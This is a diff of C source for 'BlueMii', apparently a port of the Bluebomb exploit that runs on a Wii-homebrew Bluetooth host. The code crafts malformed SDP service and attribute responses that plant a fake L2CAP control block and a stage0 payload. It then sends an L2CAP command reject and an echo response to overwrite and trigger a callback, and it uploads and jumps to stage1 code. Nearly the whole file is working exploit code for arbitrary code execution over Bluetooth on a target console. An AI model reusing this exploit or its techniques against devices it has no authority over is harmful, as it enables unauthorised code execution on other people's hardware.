@@ -2,187 +2,153 @@
 #include <stdlib.h>
 #include <gccore.h>
 #include <string.h>
-#include "lwbt/bte.h"
-#include "lwbt/btarch.h"
 #include "stream_macros.h"
 #include "stage0/stage0_bin.h"
 #include "stage1_bin.h"
+#include "lwbt/bluetooth.h"
+#include "lwbt/btarch.h"
 #include "lwbt/l2cap.h"
 #include "lwbt/btpbuf.h"
+#include "lwbt/hci.h"
 #include <unistd.h>
+#include <ogc/lwp_watchdog.h>
+
+#define SDP_ERROR_RSP				0x01
+#define SDP_SERVICE_SEARCH_REQ		0x02
+#define SDP_SERVICE_SEARCH_RSP		0x03
+#define SDP_SERVICE_ATTR_REQ		0x04
+#define SDP_SERVICE_ATTR_RSP		0x05
+#define SDP_SERVICE_SEARCH_ATTR_REQ	0x06
+#define SDP_SERVICE_SEARCH_ATTR_RSP	0x07
 
 static void *xfb = NULL;
-static bool isSearching = false;
 static GXRModeObj *rmode = NULL;
+static u64 redeploy_at = 0;
+
+struct payload_info_t {
+	void *payload;
+	size_t length;
+	size_t remaining;
+};
 
 static void SyncButton(u32 held)
 {
-	//if((__wpads_inited == WPAD_STATE_ENABLED) && __wpad_hostsynccb) {
-	//	__wpad_hostsynccb(held);
-	//}
+	
 }
 
-static s32 __bluebomb_disconnected(void *arg,struct bte_pcb *pcb,u8 err)
-{
-	fprintf(stderr, "__bluebomb_disconnected[%02x]",err);
-
-	bte_free(pcb);
-	return ERR_OK;
+void jump_payload(struct l2cap_pcb *pcb) {
+	err_t ret = ERR_OK;
+	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 1, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
+		fprintf(stderr, "jump_payload: Failed to send signal packet (%d)\n", ret);
+	}
 }
 
-struct bte_pcb *btsock = NULL;
+#define PAYLOAD_MTU 1024
 
-void jump_payload(int fd, int device_handle) {
-	struct pbuf *data;
-	int ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 1, &(btsock->sdp_pcb->remote_bdaddr), NULL);
-}
-
-#define PAYLOAD_MTU 339
-uint32_t payload_remaining = 0;
-
-void upload_payload(int fd, int device_handle, void* payload, uint32_t size) {
-	int segments = size / PAYLOAD_MTU;
-	int ret = 0;
+err_t upload_payload(struct l2cap_pcb *pcb, struct payload_info_t* payload_info) {
+	err_t ret = 0;
 	struct pbuf *data;
 	
-	fprintf(stderr, "0 / %d", size);
+	int packet_size = payload_info->remaining >= PAYLOAD_MTU ? PAYLOAD_MTU : payload_info->remaining % PAYLOAD_MTU;
+	if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
+		fprintf(stderr, "upload_payload: Could not allocate memory for pbuf\n");
+		return ERR_MEM;
+	}
+
+	memcpy(data->payload, payload_info->payload + payload_info->length- payload_info->remaining, packet_size);
+
+	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 0, &(pcb->remote_bdaddr), data)) != ERR_OK) {
+		fprintf(stderr, "upload_payload: Failed to send payload packet (%d)\n", ret);
+		return ret;
+	}
+
+	payload_info->remaining -= packet_size;
+
+	fprintf(stderr, "\r%d / %d", payload_info->length - payload_info->remaining, payload_info->length);
 	fflush(stderr);
 
-	if (payload_remaining == 0){
-		if((data = btpbuf_alloc(PBUF_RAW, PAYLOAD_MTU, PBUF_RAM)) != NULL) {
-			memcpy(data->payload, payload, PAYLOAD_MTU);
-
-			fprintf(stderr, "\r%d / %d", PAYLOAD_MTU, size);
-			fflush(stderr);
-			ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
-		}
-
-		payload_remaining = size - PAYLOAD_MTU;
-	} else if (payload_remaining >= PAYLOAD_MTU) {
-		if((data = btpbuf_alloc(PBUF_RAW, PAYLOAD_MTU, PBUF_RAM)) != NULL) {
-			memcpy(data->payload, payload + size - payload_remaining, PAYLOAD_MTU);
-
-			fprintf(stderr, "\r%d / %d", size - payload_remaining, size);
-			fflush(stderr);
-			ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
-		}
-
-		payload_remaining -= PAYLOAD_MTU;
-	} else {
-		if((data = btpbuf_alloc(PBUF_RAW, payload_remaining, PBUF_RAM)) != NULL) {
-			memcpy(data->payload, payload + size - payload_remaining, payload_remaining);
-
-			fprintf(stderr, "\r%d / %d", size, size);
-			fflush(stderr);
-			ret = l2cap_signal(NULL, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
-		}
-
-		payload_remaining = 0;
-		fprintf(stderr, "\nJumping to payload!\n");
-		jump_payload(0, 0);
+	if (payload_info->remaining == 0) {
+		return 1;
 	}
+
+	return ERR_OK;
 }
 
-err_t bluebomb_success(void)
+#define PAYLOAD_RESP(a,b) ((u16_t)((a) << 8) | (b))
+
+err_t bluebomb_success2(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_t id)
 {
-	//fprintf(stderr, "Got response!\n");
-	
-	//fprintf(stderr, "Uploading payload...\n");
-	upload_payload(0, 0, stage1_bin, stage1_bin_length);
-	//fprintf(stderr, "Jumping to payload!\n");
-	//jump_payload(raw_sock, device_handle);
+	struct payload_info_t* payload_info = (struct payload_info_t*)arg;
+
+	bool done_uploading = false;
+	if (PAYLOAD_RESP('S','0')) {
+		done_uploading = upload_payload(pcb, payload_info);
+	}
+
+	if (done_uploading) {
+		fprintf(stderr, "\nJumping to payload!\n");
+		jump_payload(pcb);
+		l2ca_bluebomb(pcb, NULL);
+
+		redeploy_at = gettime() + millisecs_to_ticks(100);
+	}
 	
 	return ERR_OK;
 }
 
-static s32 __bluebomb_accept_step2(void *arg,struct bte_pcb *pcb,u8 err)
+err_t bluebomb_success(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_t id)
 {
-	fprintf(stderr, "__bluebomb_accept_step2(%d)", err);
+	struct payload_info_t* payload_info = (struct payload_info_t*)arg;
 
-	l2ca_bluebomb(pcb->sdp_pcb, bluebomb_success);
-
-	if (err!=ERR_OK) {
-		bte_disconnect(pcb);
-		return ERR_OK;
+	if (PAYLOAD_RESP('S','0')) {
+		fprintf(stderr, "Got response!\nUploading payload...\n0 / %d", payload_info->length);
+		fflush(stderr);
+		l2ca_bluebomb(pcb, bluebomb_success2);
+		return bluebomb_success2(arg, pcb, resp, id);
 	}
+	
+	return ERR_OK;
+}
 
-	return err;
+err_t bluebomb_disconnected_ind(void *arg, struct l2cap_pcb *pcb, err_t err)
+{
+	struct payload_info_t* payload_info = (struct payload_info_t*)arg;
+	payload_info->remaining = 0;
+
+	l2cap_close(pcb);
+	return ERR_OK;
 }
 
 uint32_t L2CB = 0;
-struct l2cap_payload {
-	uint8_t opcode;
-	uint8_t id;
-	uint16_t length;
-	uint8_t data[];
-} __attribute__ ((packed));
-#define L2CAP_PAYLOAD_LENGTH 4
 
-struct l2cap_packet {
-	uint16_t length;
-	uint16_t cid;
-	struct l2cap_payload payload;
-} __attribute__ ((packed));
-#define L2CAP_HEADER_LENGTH 4 // L2CAP_HDR_LEN
-#define L2CAP_OVERHEAD 8
-
-extern void hci_get_bd_addr(struct bd_addr *bdaddr);
-
-void do_hax(int raw_sock, int device_handle) {
+err_t do_hax(struct l2cap_pcb *pcb) {
 	err_t ret;
 	struct pbuf *data;
-	// Chain these packets together so things are more deterministic.
-	int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
-	int empty_packet_len = L2CAP_PAYLOAD_LENGTH;
-	int total_length = L2CAP_HEADER_LENGTH + bad_packet_len + empty_packet_len;
-	struct pbuf *hax = btpbuf_alloc(PBUF_RAW,total_length,PBUF_RAM);
-	//struct l2cap_packet *hax = malloc(total_length);
-	struct l2cap_payload *p = (struct l2cap_payload *)hax->payload;
-	
-	//hax->length = htole16(bad_packet_len + empty_packet_len);
-	//hax->cid = htole16(0x0001);
 	
 	fprintf(stderr, "Overwriting callback in switch case 0x9.\n");
 	
-	/*p->opcode = 0x01; // L2CAP_CMD_REJECT
-	p->id = 0x00;
-	p->length = htole16(0x0006);
-	uint8_t *d = &p->data[0];
-	
-	UINT16_TO_STREAM(d, L2CAP_INVALID_CID); // L2CAP_CMD_REJ_INVALID_CID
-	UINT16_TO_STREAM(d, 0x0000); // rcid (from faked ccb)
-	UINT16_TO_STREAM(d, 0x0040 + 0x1f); // lcid
-	
-	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));*/
+	if((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) == NULL) {
+		fprintf(stderr, "do_hax: Could not allocate memory for pbuf\n");
+		return ERR_MEM;
+	}
 
-	if((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) != NULL) {
-		((u16_t *)data->payload)[0] = htole16(L2CAP_INVALID_CID);
-		((u16_t *)data->payload)[1] = htole16(0x0000); // rcid (from faked ccb)
-		((u16_t *)data->payload)[2] = htole16(0x0040 + 0x1f); // lcid
+	((u16_t *)data->payload)[0] = htole16(L2CAP_INVALID_CID);
+	((u16_t *)data->payload)[1] = htole16(0x0000); // rcid (from faked ccb)
+	((u16_t *)data->payload)[2] = htole16(0x0040 + 0x1f); // lcid
 
-		ret = l2cap_signal(NULL, L2CAP_CMD_REJ, 0, &(btsock->sdp_pcb->remote_bdaddr), data);
+	if ((ret = l2cap_signal(pcb, L2CAP_CMD_REJ, 0, &(pcb->remote_bdaddr), data)) != ERR_OK) {
+		fprintf(stderr, "do_hax: Failed to send hax packet (%d)\n", ret);
+		return ret;
 	}
 	
 	fprintf(stderr, "Trigger switch statement 0x9.\n");
-	
-	/*p->opcode = 0x09; // L2CAP_CMD_ECHO_RSP which will trigger a callback to our payload
-	p->id = 0x00;
-	p->length = htole16(0x0000);
-	
-	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
-	
-	fprintf(stderr, "Sending hax\n");
-	lp_acl_write(&btsock->sdp_pcb->remote_bdaddr, hax, total_length);*/
-	ret = l2cap_signal(btsock->sdp_pcb, L2CAP_ECHO_RSP, 0, &(btsock->sdp_pcb->remote_bdaddr), NULL);
-	//btpbuf_free(hax);
-	
-	fprintf(stderr, "Awaiting response from stage0\n");
-	//int ret = await_response(raw_sock, 0x5330); // 'S0'
-	//if (ret < 0) {
-	//	fprintf(stderr, "Didn't find response from stage0\n");
-	//	return;
-	//}
-	//fprintf(stderr, "Got response!\n");
+
+	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 0, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
+		fprintf(stderr, "do_hax: Failed to send trigger packet (%d)\n", ret);
+		return ret;
+	}
+
+	return ERR_OK;
 }
 
 struct ccb {
@@ -196,18 +162,23 @@ struct ccb {
 	// We only go up to the fields we care about, you should still leave the rest blank as there are some fields that should be just left zero after it like the timer object.
 };
 
-// TODO: Figure out the real MTU instead of choosing semi-random numbers
-#define SDP_MTU 0xD0
-
-void send_sdp_service_response(u16_t tid) {
+err_t send_sdp_service_response(struct l2cap_pcb *pcb,u16_t tid) {
 	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
 	uint32_t SDP_CB = L2CB + 0xc00;
 	
-	uint8_t *response = malloc(required_size);
-	memset(response, 0x00, required_size);
-	uint8_t *p = response;
-	
+	err_t ret;
+
+	uint8_t *p;
+	struct pbuf *data;
+
+	fprintf(stderr, "Sending SDP service response\n");
+	if((data = btpbuf_alloc(PBUF_RAW, required_size, PBUF_RAM)) == NULL) {
+		fprintf(stderr, "send_sdp_service_response: Could not allocate memory for pbuf\n");
+		return ERR_MEM;
+	}
+
 	struct ccb fake_ccb;
+	p = data->payload;
 	memset(&fake_ccb, 0x00, sizeof(struct ccb));
 	fake_ccb.in_use = 1;
 	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
@@ -218,33 +189,60 @@ void send_sdp_service_response(u16_t tid) {
 	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
 	
 	UINT8_TO_BE_STREAM(p, SDP_SERVICE_SEARCH_RSP); // SDP_ServiceSearchResponse
-	UINT16_TO_BE_STREAM(p, tid); // Transaction ID (ignored, no need to keep track of)
+	UINT16_TO_BE_STREAM(p, tid); // Transaction ID
 	UINT16_TO_BE_STREAM(p, 0x0059); // ParameterLength
 	UINT16_TO_BE_STREAM(p, 0x0015); // TotalServiceRecordCount
 	UINT16_TO_BE_STREAM(p, 0x0015); // CurrentServiceRecordCount
 	memcpy(p + (0xa * 4), &fake_ccb, sizeof(struct ccb)); p += (0x15 * 4); // Embed payload in ServiceRecordHandleList
 	UINT8_TO_BE_STREAM(p, 0x00); // ContinuationState
 
-	bte_sendsdp(btsock, response, p - response);
-	
-	uint8_t *reply = malloc(0x200);
-	//recv(fd, reply, 0x200, 0); // TODO: Check the reply for errors so we can catch things going wrong earlier.
-	free(reply);
-	free(response);
+	if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
+		fprintf(stderr, "send_sdp_service_response: Failed to send SDP service response packet (%d)\n", ret);
+		return ret;
+	}
+
+	btpbuf_free(data);
+
+	return ERR_OK;
 }
+
+static err_t __bluebomb_receive_dohax(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,err_t err)
+{
+	err_t ret = ERR_OK;
+	fprintf(stderr, "Doing hax\n");
+	if ((ret = do_hax(pcb)) == ERR_OK) {
+		l2ca_bluebomb(pcb, bluebomb_success);
+		fprintf(stderr, "Awaiting response from stage0\n");
+		l2cap_recv(pcb,NULL);
+	}
+	return ret;
+}
+
+// TODO: Figure out the real MTU instead of choosing semi-random numbers
+#define SDP_MTU 0xD0
 
 s32 size_remaining = 0;
 
-void send_sdp_attribute_response(u16_t tid, void* payload, int len) {
-	uint16_t required_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1;
-	
-	uint8_t *response = malloc(required_size);
-	memset(response, 0x00, required_size);
-	uint8_t *p = response;
+err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* payload, int len) {
+	err_t ret = ERR_OK;
 
+	uint8_t *p = NULL;
+	struct pbuf *data = NULL;
+	
 	if (size_remaining == 0) {
+		size_remaining = len;
+		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
+		uint16_t packet_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + payload_size + 1;
+		fprintf(stderr, "Sending SDP attribute response\n");
+	
+		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
+			fprintf(stderr, "send_sdp_attribute_response: Could not allocate memory for pbuf\n");
+			return ERR_MEM;
+		}
+
+		p = data->payload;
 		UINT8_TO_BE_STREAM(p, SDP_SERVICE_ATTR_RSP); // SDP_ServiceAttributeResponse
-		UINT16_TO_BE_STREAM(p, tid); // Transaction ID (ignored, no need to keep track of)
+		UINT16_TO_BE_STREAM(p, tid); // Transaction ID
 		UINT16_TO_BE_STREAM(p, 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1); // ParameterLength
 		UINT16_TO_BE_STREAM(p, 1 + 1 + 1 + 2 + 1 + SDP_MTU); // AttributeListByteCount
 		UINT8_TO_BE_STREAM(p, 0x35); // DATA_ELE_SEQ_DESC_TYPE and SIZE_1
@@ -252,98 +250,153 @@ void send_sdp_attribute_response(u16_t tid, void* payload, int len) {
 		UINT8_TO_BE_STREAM(p, 0x09); // UINT_DESC_TYPE and SIZE_2
 		UINT16_TO_BE_STREAM(p, 0xbeef); // The dummy int
 		UINT8_TO_BE_STREAM(p, 0x00); // padding so instruction is 0x4 aligned
-		memcpy(p, payload, len > SDP_MTU ? SDP_MTU : len); p += (len > SDP_MTU ? SDP_MTU : len); // payload
-		UINT8_TO_BE_STREAM(p, len <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
-		
-		bte_sendsdp(btsock, response, p - response);
-
-		size_remaining = len - SDP_MTU;
-	} else if (size_remaining > 0) {
-		// We don't have to care about giving a valid attribute sequence this time so just stick the payload right in.
-		UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
-		UINT16_TO_BE_STREAM(p, 0x0001); // Transaction ID (ignored, no need to keep track of)
-		UINT16_TO_BE_STREAM(p, 2 + SDP_MTU + 1); // ParameterLength
-		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
-		memcpy(p, payload + len - size_remaining, size_remaining > SDP_MTU ? SDP_MTU : size_remaining); p += (size_remaining > SDP_MTU ? SDP_MTU : size_remaining); // payload
+		memcpy(p, payload, payload_size); p += payload_size; // payload
 		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
+
+		if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
+			fprintf(stderr, "send_sdp_attribute_response: Failed to send SDP attribute response packet (%d)\n", ret);
+			btpbuf_free(data);
+			return ret;
+		}
+
+		btpbuf_free(data);
 		
-		bte_sendsdp(btsock, response, p - response);
-		
-		size_remaining -= SDP_MTU;
+		size_remaining -= payload_size;
 
 		if (size_remaining <= 0) {
-			do_hax(0, 0);
+			l2cap_recv(pcb,__bluebomb_receive_dohax);
 		}
-	}
+	} else if (size_remaining > 0) {
+		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
+		uint16_t packet_size = 1 + 2 + 2 + 2 + payload_size + 1;
+		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
+			fprintf(stderr, "send_sdp_attribute_response: Could not allocate memory for pbuf\n");
+			return ERR_MEM;
+		}
 
-	free(response);
-	return;
-}
+		p = data->payload;
+		// We don't have to care about giving a valid attribute sequence this time so just stick the payload right in.
+		UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
+		UINT16_TO_BE_STREAM(p, tid); // Transaction ID
+		UINT16_TO_BE_STREAM(p, 2 + SDP_MTU + 1); // ParameterLength
+		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
+		memcpy(p, payload + len - size_remaining, payload_size); p += (payload_size); // payload
+		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
+		
+		if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
+			fprintf(stderr, "send_sdp_attribute_response: Failed to send SDP attribute response packet (%d)\n", ret);
+			btpbuf_free(data);
+			return ret;
+		}
 
-static s32 __bluebomb_receive(void *arg,void *buffer,u16 len)
-{
-	fprintf(stderr, "__bluebomb_receive[%02x]\n",*(char*)buffer);
-	u8_t hdr = *(u8_t *)buffer;
-	buffer++;
-	u16_t tid = be16toh(*((u16_t*)(buffer)));
-	buffer += 2;
-	fprintf(stderr, "SDP PDU %d, tid %d\n", hdr, tid);
+		btpbuf_free(data);
+		
+		size_remaining -= payload_size;
 
-	switch (hdr) {
-		case SDP_SERVICE_SEARCH_REQ:
-			send_sdp_service_response(tid);
-			break;
-		case SDP_SERVICE_ATTR_REQ:
-			send_sdp_attribute_response(tid, stage0_bin, stage0_bin_len);
-			//fprintf(stderr, "Sleeping for 5 seconds to try to make sure stage0 is flushed\n");
-			//sleep(5000);
-			
-			//fprintf(stderr, "Doing hax\n");
-			//do_hax(0, 0);
-			break;
+		if (size_remaining <= 0) {
+			l2cap_recv(pcb,__bluebomb_receive_dohax);
+		}
 	}
 
 	return ERR_OK;
 }
 
-int bluebomb_accept(s32 result, void *userdata)
+static err_t __bluebomb_receive(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,err_t err)
 {
-	s32 err;
-
-	btsock = bte_new();
-	if (btsock==NULL)
-	{
-		fprintf(stderr, "bluebomb_accept: bte_new failed to alloc new sock");
-		return 0;
+	err_t ret = ERR_OK;
+	//fprintf(stderr, "__bluebomb_receive[%02x]\n",*(char*)buffer);
+	if (pcb->psm == SDP_PSM) {
+		u8_t hdr = *(u8_t *)p->payload;
+		u16_t tid = be16toh(*((u16_t*)((u8_t *)p->payload) + 1));
+		//fprintf(stderr, "SDP PDU %d, tid %d\n", hdr, tid);
+	
+		switch (hdr) {
+			case SDP_SERVICE_SEARCH_REQ:
+				ret = send_sdp_service_response(pcb, tid);
+				break;
+			case SDP_SERVICE_ATTR_REQ:
+				ret = send_sdp_attribute_response(pcb, tid, stage0_bin, stage0_bin_len);
+				break;
+		}
 	}
 
-	struct bd_addr addr;
-	hci_get_bd_addr(&addr);
-	fprintf(stderr, "Time to fuck the Wii\nWe are %02x:%02x:%02x:%02x:%02x:%02x\n", addr.addr[5], addr.addr[4], addr.addr[3], addr.addr[2], addr.addr[1], addr.addr[0]);
+	return ret;
+}
 
-	bte_received(btsock,__bluebomb_receive);
-	bte_disconnected(btsock,__bluebomb_disconnected);
-	
-	err = bte_listenasync(btsock,BD_ADDR_ANY,__bluebomb_accept_step2);
-	if(err==ERR_OK) return 1;
-	
-	fprintf(stderr, "bluebomb_accept: bte_listenasync failed(%d)", err);
+static err_t __bluebomb_accept_step2(void *arg,struct l2cap_pcb *l2cappcb,err_t err)
+{
+	struct l2cap_pcb **pcb = (struct l2cap_pcb **)arg;
 
-	bte_free(btsock);
-	btsock = NULL;
-	return 0;
+	fprintf(stderr, "Got connection handle: %p\n", l2cappcb);
+
+	if (err == ERR_OK) {
+		l2cap_recv(l2cappcb,__bluebomb_receive);
+		l2cap_disconnect_ind(l2cappcb,bluebomb_disconnected_ind);
+		*pcb = l2cappcb;
+	} else {
+		l2cap_close(l2cappcb);
+	}
+
+	return err;
+}
+
+s32 bluebomb_listenasync(struct l2cap_pcb **pcb, struct bd_addr *bdaddr)
+{
+	u32 level;
+	s32 err = ERR_OK;
+	struct l2cap_pcb *l2capcb = NULL;
+
+	LOG("bluebomb_listenasync()\n");
+	_CPU_ISR_Disable(level);
+
+	if((l2capcb = l2cap_new()) == NULL) {
+		err = ERR_MEM;
+		goto error;
+	}
+	l2cap_arg(l2capcb,pcb);
+
+	err = l2cap_connect_ind(l2capcb,bdaddr,SDP_PSM,__bluebomb_accept_step2);
+	if(err != ERR_OK) {
+		l2cap_close(l2capcb);
+	}
+
+error:
+	_CPU_ISR_Restore(level);
+	LOG("bluebomb_listenasync(%02x)\n",err);
+	return err;
+}
+
+s32_t bluebomb_accept(s32 result, void *userdata)
+{
+	err_t ret;
+	struct l2cap_pcb **pcb = (struct l2cap_pcb **)userdata;
+
+	fprintf(stderr, "Waiting to accept\n");
+
+	if((ret = bluebomb_listenasync(pcb, BD_ADDR_ANY)) != ERR_OK) {
+		fprintf(stderr, "bluebomb_accept: bluebomb_listenasync failed(%d)", ret);
+	}
+
+	return ret;
 }
 
 bool poweroff = false;
 
 void WiiPowerPressed()
 {
-    //poweroff = true;
+    poweroff = true;
 }
 
 //---------------------------------------------------------------------------------
 int main(int argc, char **argv) {
 //---------------------------------------------------------------------------------
+	struct l2cap_pcb *sdp_pcb = NULL;
+
+	struct payload_info_t payload_info = {
+		.payload = stage1_bin,
+		.length = stage1_bin_length,
+		.remaining = 0
+	};
 
 	// Initialise the video system
 	VIDEO_Init();
@@ -389,11 +442,8 @@ int main(int argc, char **argv) {
 	//set console starting position to the second row, to make space for tv's offsets
 	fprintf(stderr, "\x1b[2;0H");
 
-	fprintf(stderr, "Hello World!\n");
-	fprintf(stderr, "Connect a wiimote by pressing a button\n");
-	fprintf(stderr, "Or press the red sync button on the wii together with the wiimote!\n");
-	fprintf(stderr, "to toggle searching for guest wiimotes, press +\n");
-	fprintf(stderr, "to exit, press the home\n");
+	fprintf(stderr, "BlueMii (Bluebomb v1.5)\n");
+	fprintf(stderr, "Original code by Fullmetal5, port by Zarithya\n");
 	
 	bool test = TRUE;
 	uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1
@@ -429,23 +479,34 @@ int main(int argc, char **argv) {
 		{
 			test = FALSE;
 			//WPAD_Shutdown();
-			fprintf(stderr, "Bluetooth shut down, starting Bluebomb\n");
+			//fprintf(stderr, "Bluetooth shut down, starting Bluebomb\n");
 			L2CB = 0x811725E0; // 4.3u
 			
 			if (L2CB >= 0x81000000) {
 				fprintf(stderr, "Detected system menu\n");
 				payload_addr = 0x80004000;
 			}
-			
+
 			fprintf(stderr, "App settings:\n");
 			fprintf(stderr, "\tL2CB: 0x%08X\n", L2CB);
 			fprintf(stderr, "\tpayload_addr: 0x%08X\n", payload_addr);
 			
 			*(uint32_t*)(stage0_bin + 0x8) = htobe32(payload_addr);
 	
-			BTE_Init();
-			BTE_SetHostSyncButtonCallback(SyncButton);
-			BTE_InitCore(bluebomb_accept);
+			BT_Init(bluebomb_accept, &sdp_pcb);
+			hci_sync_btn(SyncButton);
+		}
+
+		if (sdp_pcb && payload_info.remaining == 0) {
+			payload_info.remaining = stage1_bin_length;
+			l2cap_arg(sdp_pcb, &payload_info);
+		}
+
+		if ((redeploy_at > 0) && (gettime() >= redeploy_at)) {
+			redeploy_at = 0;
+			hci_disconnect(&sdp_pcb->remote_bdaddr, HCI_OTHER_END_TERMINATED_CONN_USER_ENDED);
+			sdp_pcb = NULL;
+			bluebomb_accept(0, &sdp_pcb);
 		}
 
 		// Wait for the next frame
@@ -476,6 +537,7 @@ int main(int argc, char **argv) {
 	// this results in any connected wiimotes to be left in a seeking state
 	// in a seeking state the wiimotes will automatically reconnect when the subsystem is reinitialized
 	//WPAD_Shutdown();
+	BT_Shutdown();
 
 	return 0;
 }
